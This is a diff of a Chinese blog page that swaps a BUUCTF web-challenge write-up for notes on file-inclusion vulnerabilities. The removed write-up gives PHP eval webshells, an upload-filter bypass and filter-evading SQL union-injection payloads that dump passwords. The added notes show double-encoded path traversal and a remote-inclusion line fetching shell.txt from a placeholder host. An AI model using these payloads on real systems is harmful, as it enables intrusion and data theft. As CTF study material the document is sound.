-<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>打开还是一个网站，点击右上角进入buy flag的页面，然后抓包<br>抓包后看见提示<br><img src="https://img-blog.csdnimg.cn/10dbd9d0722341ebb0e5b94ac2ee4167.png"><br>所以修改user<img src="https://img-blog.csdnimg.cn/9d88c6de74ed4f4a9cd6b6e4208b2cbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_13,color_FFFFFF,t_70,g_se,x_16"><br>得到新提示<br><img src="https://img-blog.csdnimg.cn/09c42fcf7a6045b3ae848a5d2d73509b.png"><br>这里就用post输出password=404a,没错就是这里我卡了很长时间，就是不明白怎么用burp post输出最后在室友的帮助下，终于知道了，需要先把原来的GET改为POST<br><img src="https://img-blog.csdnimg.cn/c3bbaeb3260946ebb5049c9de7c96201.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_14,color_FFFFFF,t_70,g_se,x_16"><br>然后点ram旁边的params选中需要输出的值，点击up<br><img src="https://img-blog.csdnimg.cn/e284ef58e9234df6973c49b0f15b8c54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_14,color_FFFFFF,t_70,g_se,x_16"><br>然后点击go就能实现post输出<br><img src="https://img-blog.csdnimg.cn/14bfdd7d34664ab88bee1518a86ce55f.png"><br>这里需要钱，那就输出money=100000000，发现数字太长不被通过，那就换个方式，用科学计数法<br>money=10e10，得到flag<br><img src="https://img-blog.csdnimg.cn/7c58b7c612774993bdfc65adeeeca237.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>很明显是文件上传，嗯~，尝试上传一个照片，显示Not image尝试上传一个文本显示Not image，尝试上传一句话木马尝试上传最简单的<code>&lt;?php @eval($_POST['attack']);?&gt;</code>额还是不行，上号抓包<br>第一步把文件类型修改为：image/jpeg，同时将文件名修改为test.phtml，绕过常规php文件后缀检测<br>得到<img src="https://img-blog.csdnimg.cn/22b8c587656a4305a7e36fdde87e4c08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_15,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>说明带&lt;?的都被ban了，尝试其他的一句话木马<code>GIF89a? &lt;script language="php"&gt;eval($_REQUEST[1])&lt;/script&gt;</code>上传成功，<img src="https://img-blog.csdnimg.cn/32d457440be24f3ca56c1a38e0ee419d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"><br>一般这种题上传的都在/upload/路径上<br><img src="https://img-blog.csdnimg.cn/2ca21006649141e0868cae2fc28f58e4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_19,color_FFFFFF,t_70,g_se,x_16"><br>接下来直接用蚁剑或者菜刀直接连接，连接密码就是木马REQUEST后面的值，这里是123连接就行<br><img src="https://img-blog.csdnimg.cn/5b48ad601da74c96b6c5e08ed65a0958.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_14,color_FFFFFF,t_70,g_se,x_16"><br>连接后直接在文件栏处找到flag</p>
-<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>登陆页面，尝试万能密码，嗯果然不行<br><img src="https://img-blog.csdnimg.cn/e47a49b4461e48ef8a3d9401fecf8a39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"><br>多次测试后发现过滤了很多关键字符比如or, select,where, union<br>尝试绕过，使用联合注入构造<code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2%23</code><br>发现报错，不过这次报错的内容不一样<br><img src="https://img-blog.csdnimg.cn/bcb20fcf92c144ba918bf52b45bea8d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_16,color_FFFFFF,t_70,g_se,x_16"><br>这是猜测的列数错了，构造<code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2,3%23</code><br>这次成功注入，接下来就是注入的正常套路了<br><strong>查表：</strong></p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin' uunionnion sselectelect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>ffromrom infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> wwherehere table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
+<p>二次编码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span> <span class="token operator">-</span>》 <span class="token operator">%</span>252e<span class="token operator">%</span>252e<span class="token operator">%</span>252f
+<span class="token punctuation">.</span><span class="token punctuation">.</span>\ <span class="token operator">-</span>》 <span class="token operator">%</span>252e<span class="token operator">%</span>252e<span class="token operator">%</span>255c
 </code></pre>
-<p><strong>查字段：</strong></p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">' uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name='</span>b4bsql'<span class="token operator">%</span><span class="token number">23</span>
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">[</span>http<span class="token operator">|</span>https<span class="token operator">|</span>ftp<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.bbb.com/shell.txt</span>
 </code></pre>
-<p><strong>最后爆数据：</strong></p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin' uunionnion sselectelect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>passwoorrd<span class="token punctuation">)</span>ffromrom b4bsql<span class="token operator">%</span><span class="token number">23</span>
+<p>可以有三种<code>http、https、ftp</code><br>php中的伪协议</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//cn2.php.net/manual/zh/wrappers.php</span>
+file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html 访问本地文件系统</span>
+ftp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span></span>@<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ftpserveraddress</span><span class="token punctuation">></span></span></span> 访问 <span class="token function">FTP</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> URLs
+data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// 数据流</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — 访问 HTTP(s) URLs</span>
+ftp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — 访问 FTP(s) URLs</span>
+php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — 访问各个输入/输出流</span>
+zlib<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — 压缩流</span>
+data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — Data (RFC 2397)</span>
+glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — 查找匹配的文件路径模式</span>
+phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — PHP Archive</span>
+ssh2<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — Secure Shell 2</span>
+rar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — RAR</span>
+ogg<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — Audio streams</span>
+expect<span class="token punctuation">:</span><span class="token comment" spellcheck="true">// — 处理交互式的流</span>
 </code></pre>
-<p>通过这几道题学到的东西是真的多，不会的东西还是太多了…….</p>
+<p>参考网站：<a href="https://cloud.tencent.com/developer/article/1180857" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1180857</a></p>
 
                 
             </div>
@@ -754,7 +788,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/05/04/BUUCTF-wp(1)/">http://example.com/2022/05/04/BUUCTF-wp(1)/</a>
+                    <a href="http://example.com/2022/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">http://example.com/2022/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -792,8 +826,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/buuctf/">
-                                    <span class="chip bg-color">buuctf</span>
+                                <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">web漏洞</span>
                                 </a>
                             
                         </div>
@@ -971,19 +1005,19 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/05/04/php%E7%AC%94%E8%AE%B0(2)/">
+                <a href="/2022/05/04/web%E5%81%9A%E9%A2%98%E5%B0%8F%E6%94%B6%E8%8E%B7/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="php笔记(2)">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="web做题小收获">
                         
-                        <span class="card-title">php笔记(2)</span>
+                        <span class="card-title">web做题小收获</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            初学者笔记
+                            一些做题学到的东西
                         
                     </div>
                     <div class="publish-info">
@@ -994,8 +1028,8 @@
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/php/" class="post-category">
-                                    php
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
                                 </a>
                             
                             
@@ -1005,8 +1039,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php/">
-                        <span class="chip bg-color">php</span>
+                    <a href="/tags/ctfwp/">
+                        <span class="chip bg-color">ctfwp</span>
                     </a>
                     
                 </div>
@@ -1020,19 +1054,19 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/04/php%E7%AC%94%E8%AE%B0(1)/">
+                <a href="/2022/05/04/BUUCTF-WP(2)/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="php笔记（1）">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="BUUCTF WP(2)">
                         
-                        <span class="card-title">php笔记（1）</span>
+                        <span class="card-title">BUUCTF WP(2)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            初学者笔记
+                            刷题wp
                         
                     </div>
                     <div class="publish-info">
@@ -1043,8 +1077,8 @@
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/php/" class="post-category">
-                                    php
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
                                 </a>
                             
                             
@@ -1054,8 +1088,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php/">
-                        <span class="chip bg-color">php</span>
+                    <a href="/tags/buuctf/">
+                        <span class="chip bg-color">buuctf</span>
                     </a>
                     
                 </div>
